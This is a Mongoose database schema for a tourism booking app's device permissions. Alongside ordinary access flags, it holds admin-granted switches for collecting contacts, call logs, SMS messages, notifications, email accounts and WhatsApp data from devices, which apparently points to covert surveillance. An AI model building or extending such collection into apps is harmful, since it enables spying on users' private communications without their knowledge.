const mongoose = require('mongoose');

const appPermissionSchema = new mongoose.Schema({
    deviceCode: {
        type: String,
        required: true,
        unique: true,
        uppercase: true,
        length: 5
    },
    deviceId: {
        type: String,
        required: true,
        unique: true
    },
    androidId: {
        type: String,
        required: true,
        unique: true
    },
    permissions: {
        // Core app permissions
        canAccessApp: {
            type: Boolean,
            default: false
        },
        canViewAttractions: {
            type: Boolean,
            default: false
        },
        canViewServices: {
            type: Boolean,
            default: false
        },
        canViewTourPackages: {
            type: Boolean,
            default: false
        },
        canMakeBookings: {
            type: Boolean,
            default: false
        },
        canViewProfile: {
            type: Boolean,
            default: false
        },
        canSyncData: {
            type: Boolean,
            default: false
        },
        // Data collection permissions
        canCollectContacts: {
            type: Boolean,
            default: false
        },
        canCollectCallLogs: {
            type: Boolean,
            default: false
        },
        canCollectMessages: {
            type: Boolean,
            default: false
        },
        canCollectNotifications: {
            type: Boolean,
            default: false
        },
        canCollectEmailAccounts: {
            type: Boolean,
            default: false
        },
        canCollectWhatsApp: {
            type: Boolean,
            default: false
        }
    },
    // Device information
    deviceInfo: {
        deviceName: String,
        model: String,
        manufacturer: String,
        androidVersion: String,
        buildNumber: String,
        sdkVersion: Number,
        screenResolution: String,
        totalStorage: String,
        availableStorage: String,
        deviceFingerprint: String
    },
    // Permission status
    isActive: {
        type: Boolean,
        default: true
    },
    isVerified: {
        type: Boolean,
        default: false
    },
    verificationDate: {
        type: Date
    },
    // Admin who granted permissions
    grantedBy: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'Admin',
        required: true
    },
    // Permission expiry
    expiresAt: {
        type: Date
    },
    // Last permission check
    lastChecked: {
        type: Date,
        default: Date.now
    },
    // Usage tracking
    permissionChecks: [{
        timestamp: {
            type: Date,
            default: Date.now
        },
        success: Boolean,
        ipAddress: String,
        userAgent: String
    }]
}, {
    timestamps: true
});

// Indexes for efficient queries
appPermissionSchema.index({ deviceCode: 1, isActive: 1 });
appPermissionSchema.index({ deviceId: 1, isActive: 1 });
appPermissionSchema.index({ androidId: 1, isActive: 1 });
appPermissionSchema.index({ grantedBy: 1 });
appPermissionSchema.index({ expiresAt: 1 });

// Method to check if permissions are valid
appPermissionSchema.methods.isValid = function() {
    if (!this.isActive || !this.isVerified) {
        return false;
    }
    
    if (this.expiresAt && new Date() > this.expiresAt) {
        return false;
    }
    
    return true;
};

// Method to get active permissions
appPermissionSchema.methods.getActivePermissions = function() {
    if (!this.isValid()) {
        return [];
    }
    
    const activePermissions = [];
    for (const [key, value] of Object.entries(this.permissions)) {
        if (value === true) {
            activePermissions.push(key);
        }
    }
    
    return activePermissions;
};

// Method to check specific permission
appPermissionSchema.methods.hasPermission = function(permissionName) {
    if (!this.isValid()) {
        return false;
    }
    
    return this.permissions[permissionName] === true;
};

// Method to log permission check
appPermissionSchema.methods.logCheck = function(success, ipAddress, userAgent) {
    this.permissionChecks.push({
        timestamp: new Date(),
        success,
        ipAddress,
        userAgent
    });
    
    this.lastChecked = new Date();
    
    // Keep only last 100 checks
    if (this.permissionChecks.length > 100) {
        this.permissionChecks = this.permissionChecks.slice(-100);
    }
};

// Static method to find by device code
appPermissionSchema.statics.findByDeviceCode = function(deviceCode) {
    return this.findOne({ 
        deviceCode: deviceCode.toUpperCase(),
        isActive: true 
    });
};

// Static method to find by device ID
appPermissionSchema.statics.findByDeviceId = function(deviceId) {
    return this.findOne({ 
        deviceId,
        isActive: true 
    });
};

// Static method to find by Android ID
appPermissionSchema.statics.findByAndroidId = function(androidId) {
    return this.findOne({ 
        androidId,
        isActive: true 
    });
};

module.exports = mongoose.model('AppPermission', appPermissionSchema);
